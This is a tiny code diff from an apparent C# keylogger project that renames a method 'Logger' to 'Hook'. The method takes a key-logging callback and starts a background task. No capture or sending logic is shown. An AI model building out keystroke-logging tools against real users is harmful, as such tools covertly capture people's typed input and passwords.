@@ -21,7 +21,7 @@ namespace keylogger
             start = false;
         }
 
-        public void Logger(Action<Key> LogKeys)
+        public void Hook(Action<Key> LogKeys)
         {
             Task.Run(() =>
             {
